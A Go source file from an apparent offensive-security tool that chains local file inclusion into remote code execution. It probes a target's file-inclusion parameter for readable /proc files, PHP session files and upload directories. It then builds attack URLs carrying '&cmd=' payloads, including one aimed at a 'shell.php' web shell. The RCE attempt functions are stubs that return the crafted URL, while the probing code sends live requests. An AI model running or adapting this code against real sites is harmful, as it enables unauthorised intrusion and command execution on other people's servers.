package exploit

// RCEVector represents an RCE attack vector
type RCEVector struct {
	Type        string
	Path        string
	Description string
	Writable    bool
	ShellURL    string
}

// RCEChain handles LFI to RCE exploitation
type RCEChain struct {
	httpClient HTTPClientInterface
	vectors    []RCEVector
}

// CommonProcPaths common procfs paths for RCE
var CommonProcPaths = []string{
	"/proc/self/environ",
	"/proc/self/fd/0",
	"/proc/self/fd/1",
	"/proc/self/fd/2",
	"/proc/self/cmdline",
	"/proc/self/status",
	"/proc/version",
	"/proc/cmdline",
}

// CommonSessionPaths common session file paths
var CommonSessionPaths = []string{
	"/tmp/sess_",
	"/var/lib/php/sessions/sess_",
	"/var/tmp/sess_",
	"/tmp/sessions/sess_",
}

// CommonUploadPaths common upload directories
var CommonUploadPaths = []string{
	"/uploads/",
	"/upload/",
	"/files/",
	"/images/",
	"/assets/",
	"/static/",
	"/media/",
	"/var/www/html/uploads/",
	"/var/www/html/upload/",
	"/var/www/html/images/",
}

// NewRCEChain creates a new RCE chain handler
func NewRCEChain(client HTTPClientInterface) *RCEChain {
	return &RCEChain{
		httpClient: client,
		vectors:    make([]RCEVector, 0),
	}
}

// FindRCEVectors attempts to find RCE vectors
func (rc *RCEChain) FindRCEVectors(targetURL, param string, osType string) []RCEVector {
	vectors := make([]RCEVector, 0)

	// Test procfs vectors (Linux)
	if osType == "linux" {
		for _, path := range CommonProcPaths {
			testURL := targetURL + "?" + param + "=" + path
			resp, err := rc.httpClient.GetWithHeader(testURL, "", "")
			if err == nil && len(resp) > 0 {
				vectors = append(vectors, RCEVector{
					Type:        "procfs",
					Path:        path,
					Description: "Process filesystem read",
					Writable:    false,
				})
			}
		}
	}

	// Test session file paths
	for _, path := range CommonSessionPaths {
		testURL := targetURL + "?" + param + "=" + path + "test"
		_, err := rc.httpClient.GetWithHeader(testURL, "", "")
		if err == nil {
			vectors = append(vectors, RCEVector{
				Type:        "session",
				Path:        path,
				Description: "PHP session file",
				Writable:    true, // Can be written via session fixation
			})
		}
	}

	// Test upload paths
	for _, path := range CommonUploadPaths {
		testURL := targetURL + "?" + param + "=" + path + ".htaccess"
		resp, err := rc.httpClient.GetWithHeader(testURL, "", "")
		// If we get an error, the path might exist but not readable
		if err == nil || resp != "" {
			vectors = append(vectors, RCEVector{
				Type:        "upload",
				Path:        path,
				Description: "Upload directory",
				Writable:    true,
			})
		}
	}

	rc.vectors = vectors
	return vectors
}

// GetWritablePaths returns writable paths for RCE
func (rc *RCEChain) GetWritablePaths() []RCEVector {
	writable := make([]RCEVector, 0)
	for _, v := range rc.vectors {
		if v.Writable {
			writable = append(writable, v)
		}
	}
	return writable
}

// AttemptRCE attempts to achieve RCE via various vectors
func (rc *RCEChain) AttemptRCE(targetURL, param string, vector RCEVector, payload string) (bool, string) {
	switch vector.Type {
	case "procfs":
		// Try to write via /proc/self/environ if writable
		return rc.tryProcfsRCE(targetURL, param, vector.Path, payload)
	case "session":
		// Try session fixation
		return rc.trySessionRCE(targetURL, param, vector.Path, payload)
	case "upload":
		// Try to include uploaded file
		return rc.tryUploadRCE(targetURL, param, vector.Path, payload)
	}
	return false, ""
}

// tryProcfsRCE attempts RCE via procfs
func (rc *RCEChain) tryProcfsRCE(targetURL, param, path, payload string) (bool, string) {
	// This would require the procfs to be writable
	// For now, return the attempt URL
	testURL := targetURL + "?" + param + "=" + path + "&cmd=" + payload
	return false, testURL
}

// trySessionRCE attempts RCE via session files
func (rc *RCEChain) trySessionRCE(targetURL, param, path, payload string) (bool, string) {
	// Set session and then include
	sessionID := "test" + payload
	testURL := targetURL + "?" + param + "=" + path + sessionID + "&cmd=" + payload
	return false, testURL
}

// tryUploadRCE attempts RCE via uploaded files
func (rc *RCEChain) tryUploadRCE(targetURL, param, path, payload string) (bool, string) {
	testURL := targetURL + "?" + param + "=" + path + "shell.php&cmd=" + payload
	return false, testURL
}

// GetVectors returns all discovered vectors
func (rc *RCEChain) GetVectors() []RCEVector {
	return rc.vectors
}
